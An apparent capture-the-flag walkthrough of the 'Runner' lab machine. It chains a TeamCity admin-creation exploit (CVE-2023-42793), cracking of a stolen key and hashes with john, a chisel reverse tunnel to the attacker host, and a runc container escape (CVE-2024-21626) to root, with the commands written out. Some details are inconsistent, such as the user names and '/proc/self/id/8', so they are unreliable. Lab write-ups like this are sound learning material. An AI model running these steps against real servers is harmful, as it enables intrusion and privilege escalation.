## CVE-2023-42793 for Jet Brains

We can see the version of `TeamCity build management server`.

![Image](/assets/img/post/runner/2.png)

Googling `Teamcity 2023.05.3` exploit i found a `RCE` vulnerability for it.

![Image](/assets/img/post/runner/3.png)

PoC[^poc]: <https://github.com/Zyad-Elsayed/CVE-2023-42793>

```bash
python3 exploit.py -u http://teamcity.runner.htb -n test2 -p test122 -e test2@test.com
```

![Image](/assets/img/post/runner/4.png)

The script exploits to create an admin account on a TeamCity server. It sends a POST request to the target URL to create an admin user with specified or random credentials.

## SSH

Once inside, I enumerate these sections and found in Diagnostics make a backup and storage in a zip file and can we display the folders and found id_rsa.

![Image](/assets/img/post/runner/6.png)

We go to download and save for login with ssh.

![Image](/assets/img/post/runner/7.png)

Wait.. but dont have a user for login with ssh...

![Image](/assets/img/post/runner/8.png)

We also found users and there hashes in same folder.

![Image](/assets/img/post/runner/9.png)

## Crack Hash

We go to crack the password for it.

![Image](/assets/img/post/runner/10.png)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
```
Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Remaining 1 password hash Cost 1 (iteration count) is 128 for all loaded hashes Will run 2 OpenMP threads

Password: `piper123`

Till now we have one id_rsa file, two users (Methew, jhon),password for Methew.

`ssh -i id_rsa john@10.10.11.13`

## Port Forwarding

```bash
netstat -nltp
ss -nltpu
```

127.0.0.1:9000 its potential, Iâ€™ll be employing Chisel for port forwarding.

![Image](/assets/img/post/runner/13.png)

```bash
chisel server -p 6150 --reverse (Attack Machine)
./chisel client 10.10.14.68:6150 R:9000:127.0.0.1:9000 (Victim machine)
```

![Image](/assets/img/post/runner/14.png)

We go to our port 9000

![Image](/assets/img/post/runner/15.png)

## Docker

Login with credentials `matthew` - `piper123`

## CVE-2024-21626 for Docker

![Image](/assets/img/post/runner/17.png)

the path `/proc/self/id/8` is from the [CVE-2024-21626](https://nitroc.org/en/posts/cve-2024-21626-illustrated/#how-docker-engine-calls-runc) - [PoC - GitHub](https://github.com/NitroCao/CVE-2024-21626?tab=readme-ov-file)

![Image](/assets/img/post/runner/18.png)

Now we go to console

![Image](/assets/img/post/runner/19.png)

Execute a `/bin/bash` as root

![Image](/assets/img/post/runner/20.png)

Just login as root and look the folder `root` for the flag

![Image](/assets/img/post/runner/21.png)
